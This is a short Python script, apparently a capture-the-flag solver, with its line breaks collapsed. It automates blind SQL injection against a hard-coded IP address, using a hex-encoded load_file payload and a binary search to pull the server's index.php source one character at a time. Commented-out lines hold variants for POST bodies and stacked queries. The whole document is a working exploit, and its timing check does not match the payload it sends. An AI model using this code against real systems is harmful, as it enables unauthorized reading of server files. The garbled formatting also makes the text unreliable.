# coding=utf-8import requestsimport threadingimport stringimport timeimport syspt = '{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-+[]?<>@!#$%^&*~'url = "http://122.112.249.228:10083/index.php"headers = {"Content-Type": "application/x-www-form-urlencoded"}def timeblind(start, end):    ret = ""    for i in range(start, end):        l = 32        r = 128        while (l + 1 < r):            mid = (l + r) // 2            payload = "14-(if(ascii(substr((select load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)),{},1))>{},1,1000))".format(str(i), str(mid))            # print payload            cookies = {                "PHPSESSID": 'k4vs406ichnlsfqpt1brpo53nb'            }            param = {                # "orderby":payload,                "id": payload            }            # data = {            #    "id":"1;@t={0};prepare x from @t;execute x;#".format(str2hex(payload)),            # }            # data ={            #    "id":payload            # }            # print chr(mid)            # print param            # req=requests.get(url,params=param,cookies=cookies)            start = time.time()            req = requests.get(url + '/?id=' + payload)            # req=requests.post(url,data=data,headers=headers)            # if (req.status_code != requests.codes.ok):            #    continue            # print(req.text)            # if (len(req.text)>10):            if (time.time() - start >= 3):                # print("?")                # if "Lucia" in req.text:                l = mid            else:                # print("?1")/                r = mid        if (chr(r) not in pt or chr(r) == '!'):            break        ret = ret + chr(r)        print(ret)        sys.stdout.write("[-]{0} Result : -> {1} <-\r".format(threading.current_thread().name, ret))        sys.stdout.flush()    print(threading.current_thread().name + "[+]Result : ->" + ret + "<-")timeblind(1, 20)